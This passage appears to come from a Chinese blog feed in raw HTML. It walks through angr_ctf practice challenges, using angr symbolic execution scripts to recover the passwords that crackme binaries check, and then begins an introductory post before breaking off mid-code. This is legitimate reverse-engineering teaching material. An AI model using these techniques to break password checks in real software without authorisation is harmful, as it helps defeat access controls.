string">"./05_angr_symbolic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048601</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password0_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C0</span>  password1_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C8</span>  password2_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d0</span>  password3_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d8</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password1_address<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password2_address<span class="token punctuation">,</span> password2<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password3_address<span class="token punctuation">,</span> password3<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution3 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password3<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>      solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span> solution2 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span>solution3    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码解读：</p><ul><li><p><code>start_address</code> 选择 0x08048601 是因为这里是 <code>scanf</code> 函数结束的位置，并且是一个 <code> for</code> 循环的开始位置，它循环了31次：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110551215.png" alt="image-20220501110551215"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> ，因为每个地址存储 8 字节，那么就是 64 位 </p></li><li><p><code>solution_state.solver.eval(password,cast_to=bytes)</code> 是一个格式化内容的作用，将向量转为 <code>bytes</code> 类型</p></li></ul><p>最后得到结果：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110026973.png" alt="image-20220501110026973"></p><h1 id="Part-5-angr-symbolic-dynamic-memory"><a href="#Part-5-angr-symbolic-dynamic-memory" class="headerlink" title="Part 5 angr symbolic dynamic memory"></a>Part 5 angr symbolic dynamic memory</h1><p>其实这一部分和 Part 4 原理差不多，只是将输入内容存储到了分配的堆块内容中，这部分来看看如何应对这种随机地址的问题。</p><p>使用 IDA 查看程序逻辑，依然是用 <code>scanf</code> 获取输入，存储到 <code>malloc</code> 函数返回的地址中，<code>buffer0</code> 和 <code>buffer1</code> 都是 bss 段地址，随后对输入进行处理，最后分别对比两个地址内容，成功输出”Good Job”，失败输出”Try again”：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113842249.png" alt="image-20220501113842249"></p><p>其实 angr 并没有真正的执行程序，所以说在符号执行 <code>malloc</code> 的时候并不是真正的分配了一个堆块，我们只需要分别随意写一个地址到 <code>buffer0</code> 和 <code>buffer1</code> 全局变量中即可。接下来查看完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./06_angr_symbolic_dynamic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048699</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  fake_heap_address0 <span class="token operator">=</span> <span class="token number">0x12345678</span>  pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>  fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>  pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b' '</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码解读：</p><ul><li><p><code>start_address</code> 依然是 <code>scanf</code> 函数结尾，并且是循环开始的地址</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501114723729.png" alt="image-20220501114723729"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> 输入的也是 8 字节，所以是 64 位</p></li><li><p>接下来这段代码，分别将伪造的堆地址 0x12345678、 0x12345680 写入到全局变量 <code>buffer0</code>、<code>buffer1</code> 中：</p></li></ul>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_heap_address0 <span class="token operator">=</span> <span class="token number">0x12345678</span>pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把伪造地址给了 <code>buffer0</code> 和 <code>buffer1</code> 之后，处理起来就和 Part4 的过程一样了。最后求解得到结果：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113539990.png" alt="image-20220501113539990"></p><h1 id="Part-6-angr-symbolic-file"><a href="#Part-6-angr-symbolic-file" class="headerlink" title="Part 6 angr symbolic file"></a>Part 6 angr symbolic file</h1><p>07_angr_symbolic_file 例子可以用于学习如何模拟一个文件系统，当然还可以用之前学习过的方式解决问题。IDA 分析文件，使用 <code>fread</code> 函数从文件中读取内容，处理后进行对比，如果正确输出”Good Job”，<code>ignore_me</code> 将输入内容写入到文件中，是需要绕过的函数：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502111158805.png" alt="image-20220502111158805"></p><p>现在要处理的问题：</p><ul><li>确定 <code>fread</code> 读取的文件</li><li>使用 angr 模拟一个文件系统，替换 <code>fread</code> 读取的文件为我们自己的文件</li><li>用符号值初始化文件，用 <code>fread</code> 读取并传播求解，最后得到正确密码</li></ul><p>首先确定 <code>start_address</code> 。通过分析，程序从 0x080488EA 开始打开 OJKSQYDP.txt 文件：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122135428.png" alt="image-20220502122135428"></p><p>然后指定模拟文件所需的信息，程序中打开的文件名称是固定的，可以用符号替换文件名。由 <code>%64s</code> 可以得知写入的文件大小为 64 字节，但实际只循环读取了 8 字节，在创建向量的时候就是 64 位。然后使用 angr 的 <code>SimFile</code> 模块模拟文件系统：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>password_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后就是指定 <code>find</code> 和 <code>avoid</code>。完整代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">'./07_angr_symbolic_file'</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x080488D6</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  <span class="token comment"># :string</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>  password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>  password_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Good Job.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Try again.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后求得密码：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122600085.png" alt="image-20220502122600085"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr入门(一)</title>
      <link href="/2022/04/26/angr-ru-men/"/>
      <url>/2022/04/26/angr-ru-men/</url>
      
        <content type="html"><![CDATA[<p>之前一直想学习一下 angr 符号执行，在 CTF 题目中虽然接触过很多次，也用过那么一两次，但都是用的别人的代码，完全不理解其中的运行机制，脚本也是不知其义，还埋怨 angr 不好用。在重新读了一遍官方文档后才知道 angr 其实很强大，可以只执行自己想要执行的函数而不用执行整个程序。正好最近看到一个开源项目用于练习 angr，那就从0开始彻底把 angr 学习一下，对 Fuzz 工作也是很有帮助的。</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>首先介绍一下 angr 吧。它是一个用于二进制文件分析的 Python 框架，结合了静态分析和动态符号的分析。angr 学习的路线比较陡峭，不是说它有多难，而是没有合适的学习资料和连贯的学习路径。这里我找到了一个开源项目 <a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>，它从0开始一步一步教我们使用 angr 的功能。</p><p>符号执行的意义就是在不实际运行程序的情况下对程序进行分析，以了解在什么状态下，执行了哪条路径的代码。举一个最常见的例子，CTF 中的逆向题目，通常是知道程序的输出结果，要我们去逆向加密算法，得到我们应该输入的正确内容，也就是 flag。</p><p>符号执行就允许我们把程序当作一个方程来求解，就像是方程式中的 X、Y 等符号，而程序执行的路径用于“约束”符号。举个例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fail."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的代码里，<code>if</code> 语句产生两条路径，要么打印”Success!!”，要么打印”Fail”，其实就是 <code>if</code> 语句对符号 <code>x</code> 的约束。假设现在我们对 “Success!!”这条路径比较感兴趣，那么就必须满足 <code>1 &lt; x &lt; 10</code>，这个公式就是符号执行中的约束，符号执行引擎将此语句注入一个符号标识，继续向后运行以找到符合约束的值。</p><p>上面的程序比较简单，因为它只有两条路径，很容易就可以求解。当遇到特别大的程序时会有很多路径，此时就会遇到“路径爆炸”的问题，因为每条路径向下执行时，路径都是呈指数增长的，相对于求解的时间就比较长了，可能到 <a href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%AF%82">热寂</a> 都无法求解出来。</p><h1 id="Part-0-angr-find"><a href="#Part-0-angr-find" class="headerlink" title="Part 0 angr find"></a>Part 0 angr find</h1><p>进入正题，首先把 angr_ctf 克隆下来，进入到 dist&#x2F; 文件夹下，这里可以找到许多练习题目和一堆 xx.py 的文件。找到 00_angr_find 的文件，这是第一个题目，逻辑相当简单，要求输入一个字符串，程序对字符串进行处理后要和“JACEJGCS”相同：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426233408003.png" alt="image-20220426233408003"></p><p>通常情况下需要对 <code>complex_function</code> 函数进行手动逆向，现在直接用 angr 约束求解，得到应该输入的正确字符串。接下来查看解题代码 scaffold00.py ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    print_good_address <span class="token operator">=</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在逐行分析，首先导入了 angr 库和 sys 库：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span 